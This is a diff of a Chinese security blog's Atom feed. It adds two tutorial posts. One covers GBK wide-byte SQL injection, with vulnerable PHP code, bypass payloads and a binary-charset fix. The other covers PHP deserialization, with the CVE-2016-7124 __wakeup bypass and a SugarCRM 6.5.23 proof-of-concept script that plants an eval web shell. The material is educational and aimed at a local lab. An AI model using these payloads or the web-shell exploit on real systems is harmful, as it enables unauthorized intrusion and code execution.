@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://uknowsec.cn/"/>
-  <updated>2017-07-24T02:18:54.264Z</updated>
+  <updated>2017-08-01T04:43:01.067Z</updated>
   <id>http://uknowsec.cn/</id>
   
   <author>
@@ -14,6 +14,198 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>宽字节注入漏洞的利用与学习</title>
+    <link href="http://uknowsec.cn/posts/notes/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html"/>
+    <id>http://uknowsec.cn/posts/notes/宽字节注入漏洞的利用与学习.html</id>
+    <published>2017-08-01T01:30:37.000Z</published>
+    <updated>2017-08-01T04:43:01.067Z</updated>
+    
+    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="字符、字符集与字符序"><a href="#字符、字符集与字符序" class="headerlink" title="字符、字符集与字符序"></a>字符、字符集与字符序</h3><p>字符(character)是组成字符集(character set)的基本单位。对字符赋予一个数值(encoding)来确定这个字符在该字符集中的位置。</p>
+<p>字符序(collation)指同一字符集内字符间的比较规则。</p>
+<h3 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h3><p>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象。</p>
+<h3 id="GBK编码取值范围"><a href="#GBK编码取值范围" class="headerlink" title="GBK编码取值范围"></a>GBK编码取值范围</h3><p>GBK采用双字节表示，总体编码范围为8140-FEFE，首字节在81-FE 之间，尾字节在40-FE 之间</p>
+<h3 id="GB2313编码取值范围"><a href="#GB2313编码取值范围" class="headerlink" title="GB2313编码取值范围"></a>GB2313编码取值范围</h3><p>gb2312编码的取值范围。它的高位范围是0xA1~0xF7，低位范围是0xA1~0xFE</p>
+<h3 id="MYSQL的字符集转换过程"><a href="#MYSQL的字符集转换过程" class="headerlink" title="MYSQL的字符集转换过程"></a>MYSQL的字符集转换过程</h3><ol>
+<li><p>MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection;</p>
+</li>
+<li><p>进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：</p>
+</li>
+</ol>
+<ul>
+<li>使用每个数据字段的CHARACTER SET设定值;</li>
+<li>若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准);</li>
+<li>若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值;</li>
+<li>若上述值不存在，则使用character_set_server设定值。</li>
+</ul>
+<p>将操作结果从内部操作字符集转换为character_set_results。</p>
+<p>重点：宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。</p>
+<h3 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h3><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
+<h4 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">addslashes(string)</div></pre></td></tr></table></figure>
+<h4 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th style="text-align:center">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>string</td>
+<td style="text-align:center">必需。规定要转义的字符串。</td>
+</tr>
+</tbody>
+</table>
+<h3 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string()"></a>mysql_real_escape_string()</h3><p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。<br>下列字符受影响：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">\x00</div><div class="line">\n</div><div class="line">\r</div><div class="line">\</div><div class="line">&apos;</div><div class="line">&quot;</div><div class="line">\x1a</div><div class="line">如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</div></pre></td></tr></table></figure>
+<h4 id="语法：-1"><a href="#语法：-1" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql_real_escape_string(string,connection)</div></pre></td></tr></table></figure>
+<h4 id="参数说明：-1"><a href="#参数说明：-1" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th style="text-align:center">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>string</td>
+<td style="text-align:center">必需。规定要转义的字符串。</td>
+</tr>
+<tr>
+<td>connection</td>
+<td style="text-align:center">可选。规定 MySQL 连接。如果未规定，则使用上一个连接。</td>
+</tr>
+</tbody>
+</table>
+<h3 id="incov"><a href="#incov" class="headerlink" title="incov()"></a>incov()</h3><p>(PHP 4 &gt;= 4.0.5, PHP 5, PHP 7)<br>iconv — 字符串按要求的字符编码来转换</p>
+<h4 id="语法：-2"><a href="#语法：-2" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string iconv ( string $in_charset , string $out_charset , string $str )</div></pre></td></tr></table></figure>
+<p>将字符串 str 从 in_charset 转换编码到 out_charset。</p>
+<h4 id="参数说明：-2"><a href="#参数说明：-2" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th style="text-align:center">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>in_charset</td>
+<td style="text-align:center">输入的字符集。</td>
+</tr>
+<tr>
+<td>out_charset</td>
+<td style="text-align:center">输出的字符集。</td>
+</tr>
+<tr>
+<td>str</td>
+<td style="text-align:center">要转换的字符串。</td>
+</tr>
+</tbody>
+</table>
+<h3 id="相关字符集设置"><a href="#相关字符集设置" class="headerlink" title="相关字符集设置"></a>相关字符集设置</h3><ul>
+<li>character_set_client:客户端发送过来的SQL语句编码，也就是PHP发送的SQL查询语句编码字符集。</li>
+<li>character_set_connection:MySQL服务器接收客户端SQL查询语句后，在实施真正查询之前SQL查询语句编码字符集。</li>
+<li>character_set_database:数据库缺省编码字符集。</li>
+<li>character_set_filesystem:文件系统编码字符集。</li>
+<li>character_set_results:SQL语句执行结果编码字符集。</li>
+<li>character_set_server:服务器缺省编码字符集。</li>
+<li>character_set_system:系统缺省编码字符集。</li>
+<li>character_sets_dir:字符集存放目录，一般不要修改</li>
+</ul>
+<h2 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h2><p>　　GBK 占用两字节</p>
+<p>　　ASCII占用一字节</p>
+<p>　　PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。</p>
+<p>　　输入%df和函数执行添加的%5C，被合并成%df%5C。由于GBK是两字节，这个%df%5C被MYSQL识别为GBK。导致本应的%df\变成%df%5C。%df%5C在GBK编码中没有对应，所以被当成无效字符。</p>
+<p>　　%DF’ ：会被PHP当中的addslashes函数转义为“%DF\’” ，“\”既URL里的“%5C”，那么也就是说，“%DF’”会被转成“%DF%5C%27”倘若网站的字符集是GBK，MYSQL使用的编码也是GBK的话，就会认为“%DF%5C%27”是一个宽字符。也就是“縗’”</p>
+<h2 id="MySQL中的宽字节注入"><a href="#MySQL中的宽字节注入" class="headerlink" title="MySQL中的宽字节注入"></a>MySQL中的宽字节注入</h2><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">//连接数据库部分，注意使用了gbk编码</div><div class="line">$conn = mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;uknow&apos;) or die(&apos;bad!&apos;);</div><div class="line">mysql_query(&quot;SET NAMES &apos;gbk&apos;&quot;);</div><div class="line">mysql_select_db(&apos;test&apos;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;);</div><div class="line">//执行sql语句</div><div class="line">$id = isset($_GET[&apos;id&apos;]) ? addslashes($_GET[&apos;id&apos;]) : 1;</div><div class="line">$sql = &quot;SELECT * FROM news WHERE tid=&apos;&#123;$id&#125;&apos;&quot;;</div><div class="line">$result = mysql_query($sql, $conn) or die(mysql_error());</div><div class="line">?&gt;</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=&quot;gbk&quot; /&gt;</div><div class="line">&lt;title&gt;新闻&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;?php</div><div class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);</div><div class="line">echo &quot;&lt;h2&gt;&#123;$row[&apos;title&apos;]&#125;&lt;/h2&gt;&lt;p&gt;&#123;$row[&apos;content&apos;]&#125;&lt;p&gt;\n&quot;;</div><div class="line">mysql_free_result($result);</div><div class="line">?&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>SQL语句是SELECT * FROM news WHERE tid=’{$id}’，就是根据文章的id把文章从news表中取出来。</p>
+<p>在这个sql语句前面，使用了一个addslashes函数，将$id的值转义。这是通常cms中对sql注入进行的操作，只要输入参数在单引号中，就逃逸不出单引号的限制，无法注入，</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql1.png" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/sql2.png" alt=""></p>
+<p>一般绕过addslashes的方式就是，想办法处理\’前面的\：</p>
+<ul>
+<li>1.想办法给\前面再加一个\（或单数个即可），变成\’，这样\被转义了，’逃出了限制</li>
+<li>2.想办法把\弄没有。<br>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）。如果输入%df’看会怎样：</li>
+</ul>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql3.png" alt=""><br>其中的�\是一个汉字  我们可以改成其他的。根据gbk编码，第一个字节ascii码大于128，基本上就可以了。比如我们不用%df，用%dd也可以：</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql4.png" alt=""></p>
+<p>为什么从刚才到现在，只是在’也就是%27前面加了一个%df就报错了？而且从图中可以看到，报错的原因就是多了一个单引号，而单引号前面的反斜杠不见了。</p>
+<p>这就是mysql的特性，因为gbk是多字节编码，他认为两个字节代表一个汉字，所以%df和后面的\也就是%5c变成了一个汉字“輁”，而’逃逸了出来。</p>
+<p>因为两个字节代表一个汉字，所以我们可以试试%df%df%27：</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql5.png" alt=""></p>
+<p>不报错了。因为%df%df是一个汉字，%5c%27不是汉字，仍然是\’。</p>
+<p>我们可以利用宽字节注入的特点进行手注，也可以在url后面加上%df’丢给sqlmap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/1/0x01/index.php?id=1%df&apos;</div></pre></td></tr></table></figure></p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql6.png" alt=""></p>
+<h2 id="GB2312与GBK的不同"><a href="#GB2312与GBK的不同" class="headerlink" title="GB2312与GBK的不同"></a>GB2312与GBK的不同</h2><p>GB2312也是属于宽字节，那么使用GB2312连接数据库，看能否进行宽字节注入</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql7.png" alt=""></p>
+<p>结果就是不能注入了：</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql8.png" alt=""></p>
+<p>gb2312编码的取值范围。它的高位范围是0xA1~0xF7，低位范围是0xA1~0xFE，而\是0x5c，是不在低位范围中的。所以，0x5c根本不是gb2312中的编码，所以自然也是不会被吃掉的。</p>
+<h2 id="宽字符注入的修复"><a href="#宽字符注入的修复" class="headerlink" title="宽字符注入的修复"></a>宽字符注入的修复</h2><ul>
+<li>将character_set_client设置为binary（二进制）<br>只需在所有sql语句前指定一下连接的形式是二进制：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>当mysql接受到客户端的数据后，会认为他的编码是character_set_client，然后会将之将换成character_set_connection的编码，然后进入具体表和字段后，再转换成字段对应的编码。</p>
+<p>然后，当查询结果产生后，会从表和字段的编码，转换成character_set_results编码，返回给客户端。</p>
+<p>所以，将character_set_client设置成binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql10.png" alt=""></p>
+<p>已经不能注入了<br><img src="http://obr4sfdq7.bkt.clouddn.com/sql9.png" alt=""></p>
+<h2 id="inconv导致的致命后果"><a href="#inconv导致的致命后果" class="headerlink" title="inconv导致的致命后果"></a>inconv导致的致命后果</h2><h3 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">//连接数据库部分，注意使用了gbk编码</div><div class="line">$conn = mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;toor!@#$&apos;) or die(&apos;bad!&apos;);</div><div class="line">mysql_query(&quot;SET NAMES &apos;gbk&apos;&quot;);</div><div class="line">mysql_select_db(&apos;test&apos;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;);</div><div class="line">//执行sql语句</div><div class="line">mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn); </div><div class="line">$id = isset($_GET[&apos;id&apos;]) ? addslashes($_GET[&apos;id&apos;]) : 1;</div><div class="line">$id = iconv(&apos;utf-8&apos;, &apos;gbk&apos;, $id);</div><div class="line">$sql = &quot;SELECT * FROM news WHERE tid=&apos;&#123;$id&#125;&apos;&quot;;</div><div class="line">$result = mysql_query($sql, $conn) or die(mysql_error());</div><div class="line">?&gt;</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=&quot;gbk&quot; /&gt;</div><div class="line">&lt;title&gt;新闻&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;?php</div><div class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);</div><div class="line">echo &quot;&lt;h2&gt;&#123;$row[&apos;title&apos;]&#125;&lt;/h2&gt;&lt;p&gt;&#123;$row[&apos;content&apos;]&#125;&lt;p&gt;\n&quot;;</div><div class="line">mysql_free_result($result);</div><div class="line">?&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+<p>可以看到，它在sql语句执行前，将character_set_client设置成了binary，所以可以避免宽字符注入的问题。但之后其调用了iconv将已经过滤过的参数$id给转换了一下。</p>
+<p>给id参数一个值：錦’<br><img src="http://obr4sfdq7.bkt.clouddn.com/sql11.png" alt=""></p>
+<p>报错了。说明可以注入。</p>
+<p>“錦“这个字，它的utf-8编码是0xe98ca6，它的gbk编码是0xe55c。<br>\的ascii码正是5c。那么，当我们的錦被iconv从utf-8转换成gbk后，变成了%e5%5c，而后面的’被addslashes变成了%5c%27，这样组合起来就是%e5%5c%5c%27，两个%5c就是\，正好把反斜杠转义了，导致’逃逸出单引号，产生注入。</p>
+<p>正利用了绕过addslashes的两种方式的第一种：将\转义掉。</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" target="_blank" rel="external">浅析白盒审计中的字符编码及SQL注入</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;点击阅读全文&lt;br&gt;
+    
+    </summary>
+    
+      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>反序列化漏洞的利用与学习</title>
+    <link href="http://uknowsec.cn/posts/notes/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html"/>
+    <id>http://uknowsec.cn/posts/notes/反序列化漏洞的利用与学习.html</id>
+    <published>2017-07-28T01:39:51.000Z</published>
+    <updated>2017-08-02T01:14:33.225Z</updated>
+    
+    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
+<h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>漏洞的根源在于unserialize()函数的参数可控。如果反序列化对象中存在魔术方法，而且魔术方法中的代码有能够被我们控制，漏洞就这样产生了，根据不同的代码可以导致各种攻击，如代码注入、SQL注入、目录遍历等等。</p>
+<h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;PHP反序列化&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;?php</div><div class="line">class A&#123;</div><div class="line">	var $a = &quot;test&quot;;</div><div class="line">	function __destruct()&#123;</div><div class="line">		$fp = fopen(&quot;E:\\phpStudy\\WWW\\1.php&quot;,&quot;w&quot;);</div><div class="line">		fputs($fp,$this-&gt;a);</div><div class="line">		fclose($fp);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">$test = $_POST[&apos;test&apos;];</div><div class="line">$test_unser = unserialize($test);</div><div class="line">?&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+<p>上述代码使用了php的magic方法destruct（详情参考<a href="http://php.net/manual/en/language.oop5.magic.php" target="_blank" rel="external">PHP: Magic Methods</a>），而destruct是当一个对象被销毁时被自动调用的析构方法。<br>然后unserialize中参数可控，这样我们就可以构造一个序列化的对象A来控制其中的变量a的值，最终会产生漏洞。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>构造一个序列化的对象A并给其中变量a赋值为&lt;?php phpinfo();?&gt;如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test=O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/php1.png" alt=""></p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/php2.png" alt=""><br>如上成功将&lt;?php phpinfo();?&gt;写入1.php.</p>
+<h3 id="实例利用"><a href="#实例利用" class="headerlink" title="实例利用"></a>实例利用</h3><h4 id="基础准备"><a href="#基础准备" class="headerlink" title="基础准备"></a>基础准备</h4><p>PHP之前爆出了一个漏洞（<a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="external">CVE-2016-7124</a> ），简单来说就是当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。Demo如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;PHP&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;?php</div><div class="line">class A&#123;</div><div class="line">	var $a = &quot;test&quot;;</div><div class="line">	function __destruct()&#123;</div><div class="line">		$fp = fopen(&quot;E:\\phpStudy\\WWW\\1.php&quot;,&quot;w&quot;);</div><div class="line">		fputs($fp,$this-&gt;a);</div><div class="line">		fclose($fp);</div><div class="line">	&#125;</div><div class="line">	function __wakeup()</div><div class="line">    	&#123;</div><div class="line">        	foreach(get_object_vars($this) as $k =&gt; $v) &#123;</div><div class="line">            		$this-&gt;$k = null;</div><div class="line">        	&#125;</div><div class="line">        	echo &quot;Waking up...\n&quot;;</div><div class="line">    	&#125;</div><div class="line">&#125;</div><div class="line">$test = $_POST[&apos;test&apos;];</div><div class="line">$test_unser = unserialize($test);</div><div class="line">?&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+<p>我们再次使用之前的payload测试，结果如下：<br><img src="http://obr4sfdq7.bkt.clouddn.com/php3.png" alt=""><br>发现__wakeup函数成功执行，清除了对象属性，从而1.php内容也为空了。</p>
+<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>根据CVE-2016-7124的原理，将上面payload中A的个数变成2或者大于2的数字如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test=O:1:”A”:2:&#123;s:1:”a”;s:18:”&lt;?php phpinfo();?&gt;”;&#125;</div></pre></td></tr></table></figure></p>
+<p>然后再次执行发现绕过了__wakeup函数，成功将phpinfo()写入1.php<br><img src="http://obr4sfdq7.bkt.clouddn.com/php4.png" alt=""></p>
+<h4 id="SugarCRM-v6-5-23-PHP反序列化"><a href="#SugarCRM-v6-5-23-PHP反序列化" class="headerlink" title="SugarCRM v6.5.23 PHP反序列化"></a>SugarCRM v6.5.23 PHP反序列化</h4><p>漏洞分析：<a href="http://paper.seebug.org/39/" target="_blank" rel="external">SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析</a><br>漏洞环境：<a href="https://github.com/sugarcrm/sugarcrm_dev/tree/6.5.23/" target="_blank" rel="external">SugarCRM v6.5.23</a></p>
+<p>POC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">import requests as req</div><div class="line"></div><div class="line">url = &apos;http://127.0.0.1/sugarcrm_dev-6.5.23/service/v4/rest.php&apos;</div><div class="line"></div><div class="line">data = &#123;  </div><div class="line">    &apos;method&apos;: &apos;login&apos;,</div><div class="line">    &apos;input_type&apos;: &apos;Serialize&apos;,</div><div class="line">    &apos;rest_data&apos;: &apos;O:+14:&quot;SugarCacheFile&quot;:23:&#123;S:17:&quot;\\00*\\00_cacheFileName&quot;;s:15:&quot;../custom/1.php&quot;;S:16:&quot;\\00*\\00_cacheChanged&quot;;b:1;S:14:&quot;\\00*\\00_localStore&quot;;a:1:&#123;i:0;s:29:&quot;&lt;?php eval($_POST[\&apos;HHH\&apos;]); ?&gt;&quot;;&#125;&#125;&apos;,</div><div class="line">&#125;</div><div class="line"></div><div class="line">req.post(url, data=data)</div></pre></td></tr></table></figure></p>
+<p>脚本执行后shell位于custom/1.php：<br><img src="http://obr4sfdq7.bkt.clouddn.com/php5.png" alt=""></p>
+<h2 id="Java反序列化漏洞（待续）"><a href="#Java反序列化漏洞（待续）" class="headerlink" title="Java反序列化漏洞（待续）"></a>Java反序列化漏洞（待续）</h2><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://paper.seebug.org/39/" target="_blank" rel="external">SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析</a><br><a href="http://www.cnblogs.com/test404/p/6486435.html" target="_blank" rel="external">PHP反序列化漏洞与CVE-2016-7124</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;点击阅读全文&lt;br&gt;
+    
+    </summary>
+    
+      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>Web For Pentester I 练习笔记</title>
@@ -2585,97 +2777,6 @@
     </summary>
     
       <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>[第四周]LinuxLinux各个目录的作用及内容</title>
-    <link href="http://uknowsec.cn/posts/linux/%E7%AC%AC%E5%9B%9B%E5%91%A8-LinuxLinux%E5%90%84%E4%B8%AA%E7%9B%AE%E5%BD%95%E7%9A%84%E4%BD%9C%E7%94%A8%E5%8F%8A%E5%86%85%E5%AE%B9.html"/>
-    <id>http://uknowsec.cn/posts/linux/第四周-LinuxLinux各个目录的作用及内容.html</id>
-    <published>2017-03-17T12:54:08.000Z</published>
-    <updated>2017-03-17T13:21:15.910Z</updated>
-    
-    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
-<h2 id="主要目录"><a href="#主要目录" class="headerlink" title="主要目录"></a>主要目录</h2><h3 id=""><a href="#" class="headerlink" title="/"></a>/</h3><p>/处于Linux文件系统树形结构的最顶端，它是Linux文件系统的入口，所有的目录、文件、设备都在/之下。</p>
-<h3 id="bin"><a href="#bin" class="headerlink" title="/bin"></a>/bin</h3><p>该目录存放着系统最常用的最重要的命令，相当于DOS下的内部命令，只不过它们是以独立的文件形式存在。比如：ls、cp、mkdir等命令。这个目录中的文件都是可执行的并且是普通用户都可以使用的命令。作为系统最基础的命令都放在这里。</p>
-<h3 id="usr"><a href="#usr" class="headerlink" title="/usr"></a>/usr</h3><p>该目录是系统存放程序的地方，比如普通命令、帮助文件、安装的软件等。这个目录下有很多的文件和目录。当我们安装一个Linux发行版官方提供的软件包时，大多安装在这里。当有涉及服务器的配置文件时，会把配置文件安装在/etc目录中。/usr目录下包括涉及字体目录/usr/share/fonts、帮助目录/usr/share/man或/usr/share/doc等。</p>
-<h3 id="var"><a href="#var" class="headerlink" title="/var"></a>/var</h3><p>该目录的内容是经常变动的，/var下有/var/log目录用来存放系统日志的目录。/var/www目录用来定义Apache服务器站点存放目录。/var/lib用来存放一些库文件。</p>
-<h3 id="sbin"><a href="#sbin" class="headerlink" title="/sbin"></a>/sbin</h3><p>大多数涉及系统管理的命令都存放在该目录中，它是超级权限用户root的可执行命令存放地，普通用户无权限执行这个目录下的命令，凡是目录sbin中包含的命令都是root权限才能执行的。</p>
-<h3 id="root"><a href="#root" class="headerlink" title="/root"></a>/root</h3><p>Linux超级权限用户(系统管理员)root的主目录。</p>
-<h3 id="home"><a href="#home" class="headerlink" title="/home"></a>/home</h3><p>普通用户的主目录都默认存放在该目录中，比如：有个用户叫wang，那它的主目录就是/home/wang，也可以用~wang表示。</p>
-<h3 id="etc"><a href="#etc" class="headerlink" title="/etc"></a>/etc</h3><p>该目录是系统配置文件的所在地，一些服务器的配置文件也在这里，比如：用户帐号及密码配置文件等。</p>
-<h3 id="boot"><a href="#boot" class="headerlink" title="/boot"></a>/boot</h3><p>Linux的内核及引导系统的程序所需要的文件都存放在该目录中，比如vmlinuz、initrd.img等文件都位于这个目录中。在一般情况下，GRUB或LILO系统引导管理器在这个目录中。</p>
